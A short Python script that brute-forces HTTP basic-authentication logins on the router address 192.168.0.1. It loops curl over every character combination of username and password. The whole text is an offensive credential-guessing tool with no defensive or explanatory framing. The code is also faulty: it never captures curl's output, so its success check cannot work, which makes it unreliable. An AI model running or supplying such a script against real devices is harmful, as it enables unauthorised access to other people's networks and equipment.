from subprocess import run
from string import digits, ascii_letters, punctuation
from itertools import product

signs = digits + ascii_letters + punctuation
good = []

for i in range(15):
    for j in range(15):
        for login_pair in product(signs, repeat = i):
            for pass_pair in product(signs, repeat = j):
                login = ''.join(login_pair) + ":" + ''.join(pass_pair)
                s = run(["curl", "-u", login, "192.168.0.1"])
                print("login: " + login)
                if s.stdout is not None:
                    good.append(login)
                    break
            if len(good) != 0:
                break
        if len(good) != 0:
            break
    if len(good) != 0:
        break
print("\n\n\n" + login)